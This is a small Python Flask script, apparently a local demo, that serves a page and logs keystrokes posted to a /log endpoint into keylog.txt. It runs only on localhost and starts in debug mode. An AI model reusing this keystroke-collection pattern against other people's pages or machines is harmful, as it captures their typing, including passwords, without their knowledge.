from flask import Flask, request
import logging
import webbrowser
import threading

app = Flask(__name__)

logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

@app.route('/')
def index():
    return open('index.html').read()


@app.route('/log', methods=['POST'])
def log_key():
    key = request.json.get('key')
    logging.info(key)
    return '', 204

def open_browser():
    webbrowser.open_new('http://127.0.0.1:8080/')

if __name__ == '__main__':
    threading.Timer(1, open_browser).start()
    app.run(debug=True, port=8080)
